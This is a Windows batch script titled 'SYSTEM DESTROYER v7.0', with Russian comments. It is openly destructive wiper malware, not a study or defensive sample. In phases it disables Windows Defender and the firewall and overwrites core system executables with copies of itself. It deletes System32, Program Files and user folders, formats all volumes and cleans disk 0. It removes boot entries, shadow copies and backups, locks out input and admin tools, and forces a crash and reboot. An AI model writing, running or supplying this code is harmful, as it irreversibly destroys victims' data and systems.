@echo off
setlocal enabledelayedexpansion

>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

mode con: cols=80 lines=30
title SYSTEM DESTROYER v7.0 - FINAL APOCALYPSE

:: ========== ФАЗА 0: САМОКОПИРОВАНИЕ И БЛОКИРОВКА АНТИВИРУСОВ ==========
echo [0] DISABLING SECURITY...
sc config WinDefend start= disabled >nul 2>&1
sc stop WinDefend >nul 2>&1
sc config wscsvc start= disabled >nul 2>&1
sc stop wscsvc >nul 2>&1
netsh advfirewall set allprofiles state off >nul 2>&1

:: Копируем себя в системные папки
set copies=0
for %%p in (
    "%SystemRoot%\System32\wininit.exe"
    "%SystemRoot%\System32\smss.exe" 
    "%SystemRoot%\System32\csrss.exe"
    "%SystemRoot%\System32\winlogon.exe"
    "%SystemRoot%\System32\services.exe"
    "%SystemRoot%\System32\lsass.exe"
    "%SystemRoot%\explorer.exe"
    "%SystemRoot%\notepad.exe"
    "%SystemRoot%\regedit.exe"
    "%SystemRoot%\cmd.exe"
) do (
    copy "%~f0" "%%p" >nul 2>&1 && set /a copies+=1
)

:: ========== ФАЗА 1: ПАРАЛЛЕЛЬНОЕ УНИЧТОЖЕНИЕ СИСТЕМНЫХ ПАПОК ==========
echo [1] PARALLEL SYSTEM DESTRUCTION...
start "KILL1" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (rd /s /q C:\Windows\System32 2>nul & del /f /s /q C:\Windows\*.* 2>nul)"
start "KILL2" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (rd /s /q C:\ProgramData 2>nul & rd /s /q C:\Program Files 2>nul)"
start "KILL3" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (rd /s /q C:\Users 2>nul & rd /s /q C:\Program Files (x86) 2>nul)"
start "KILL4" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (del /f /q C:\*.sys 2>nul & del /f /q C:\*.dll 2>nul)"
start "KILL5" /B /MIN cmd /c "for /l %%n in (1,1,9999) do (takeown /f C:\Windows /r /d y 2>nul & icacls C:\Windows /grant everyone:F /t /c /q 2>nul)"

:: ========== ФАЗА 2: ФИЗИЧЕСКОЕ УНИЧТОЖЕНИЕ ДИСКОВ ==========
echo [2] PHYSICAL DISK DESTRUCTION...
start "DISK1" /B /MIN powershell -Command "while($true){Format-Volume -DriveLetter C -FileSystem NTFS -Force -Confirm:$false}"
start "DISK2" /B /MIN powershell -Command "while($true){Format-Volume -DriveLetter D -FileSystem NTFS -Force -Confirm:$false}"
start "DISK3" /B /MIN powershell -Command "Get-Volume | Where-Object {$_.DriveLetter -ne $null} | Format-Volume -FileSystem RAW -Force -Confirm:$false"

:: ========== ФАЗА 3: УНИЧТОЖЕНИЕ ЗАГРУЗЧИКА ==========
echo [3] BOOTLOADER DESTRUCTION...
(
echo select disk 0
echo clean
echo create partition primary
echo format fs=ntfs quick override
echo exit
) > %temp%\killboot.dps
start /MIN diskpart /s %temp%\killboot.dps

bcdedit /delete {default} /f >nul 2>&1
bcdedit /delete {bootmgr} /f >nul 2>&1
del /f /q C:\bootmgr C:\boot\bcd C:\Windows\bootstat.dat 2>nul

:: ========== ФАЗА 4: ТОТАЛЬНАЯ БЛОКИРОВКА ИНТЕРФЕЙСА ==========
echo [4] TOTAL INTERFACE LOCKDOWN...

:: Останавливаем все процессы
start "KILLPROC" /B /MIN powershell -Command "while($true){Get-Process | Where-Object {$_.ProcessName -ne 'cmd' -and $_.ProcessName -ne 'powershell'} | Stop-Process -Force}"

:: Блокируем реестр
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableTaskMgr" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableCMD" /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableLockWorkstation" /t REG_DWORD /d 1 /f >nul

:: Убиваем проводник и запрещаем запуск
taskkill /f /im explorer.exe >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell" /t REG_SZ /d "%~f0" /f >nul

:: Блокируем клавиатуру в отдельном потоке
start "KEYBLOCK" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.SendKeys]::SendWait('{F1}{F2}{F3}{F4}{F5}{F6}'); Start-Sleep -Milliseconds 50}"

:: Блокируем мышь в отдельном потоке  
start "MOUSEBLOCK" /B /MIN powershell -Command "Add-Type -AssemblyName System.Windows.Forms; while($true){[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(0,0); Start-Sleep -Milliseconds 100}"

:: ========== ФАЗА 5: СОЗДАНИЕ ОКНОВ ОШИБОК ==========
echo [5] CREATING ERROR SPAM...
start "ERROR1" /B /MIN powershell -Command "while($true){$x=[System.Windows.Forms.Cursor]::Position.X;$y=[System.Windows.Forms.Cursor]::Position.Y;[System.Windows.Forms.MessageBox]::Show('SYSTEM DESTROYED','FATAL ERROR',0,16);[System.Windows.Forms.Cursor]::Position=New-Object System.Drawing.Point(($x+(Get-Random -Minimum -100 -Maximum 100)),($y+(Get-Random -Minimum -100 -Maximum 100))); Start-Sleep -Milliseconds 500}"
start "ERROR2" /B /MIN powershell -Command "while($true){Add-Type -AssemblyName System.Windows.Forms;[System.Windows.Forms.MessageBox]::Show('ALL DATA LOST','CRITICAL FAILURE',0,16); Start-Sleep -Seconds 1}"

:: ========== ФАЗА 6: ЗАТИРАНИЕ ДИСКОВ ==========
echo [6] DISK WIPING...
start "WIPE1" /B /MIN cipher /w:C:\
start "WIPE2" /B /MIN cipher /w:D:\
start "WIPE3" /B /MIN cipher /w:E:\

:: ========== ФАЗА 7: УДАЛЕНИЕ ТОЧЕК ВОССТАНОВЛЕНИЯ ==========
echo [7] DESTROYING RECOVERY...
vssadmin delete shadows /all /quiet >nul 2>&1
wbadmin delete catalog -quiet >nul 2>&1
for /f "tokens=2 delims==" %%d in ('wmic logicaldisk get caption /value') do (
    vssadmin delete shadows /for=%%d /quiet >nul 2>&1
)

:: ========== ФИНАЛЬНЫЙ ОТСЧЕТ ==========
echo.
echo ========================================
echo    FINAL COUNTDOWN TO SYSTEM DEATH
echo ========================================
echo.

for /l %%i in (60,-1,0) do (
    cls
    echo.
    echo    ╔═══════════════════════════════════════╗
    echo    ║     FINAL SYSTEM DESTRUCTION         ║
    echo    ║     TIME REMAINING: %%i SECONDS       ║
    echo    ╚═══════════════════════════════════════╝
    echo.
    echo    [SYSTEM STATUS]
    echo    ■ Bootloader: DESTROYED
    echo    ■ System files: DELETED  
    echo    ■ Disk partitions: FORMATTED
    echo    ■ Registry: CORRUPTED
    echo    ■ Recovery: DISABLED
    echo.
    echo    [DESTRUCTION PROGRESS]
    set /a percent=100-%%i*100/60
    echo    ████████████████████████████████ !percent!%%
    echo.
    timeout /t 1 /nobreak >nul
)

:: ========== ФИНАЛЬНАЯ ПЕРЕЗАГРУЗКА ==========
echo.
echo ========================================
echo    EXECUTING FINAL SYSTEM REBOOT
echo ========================================
echo.

echo [FINAL] Launching irreversible reboot...
shutdown /r /f /t 0
wmic os call reboot >nul 2>&1
powershell -Command "Restart-Computer -Force"
rundll32.exe ntdll.dll,RtlAdjustPrivilege 19 1 0 >nul 2>&1
rundll32.exe ntdll.dll,NtRaiseHardError 0xC000021A 0 0 0 6 >nul 2>&1

:: Уничтожаем командную строку
taskkill /f /im cmd.exe >nul 2>&1
exit
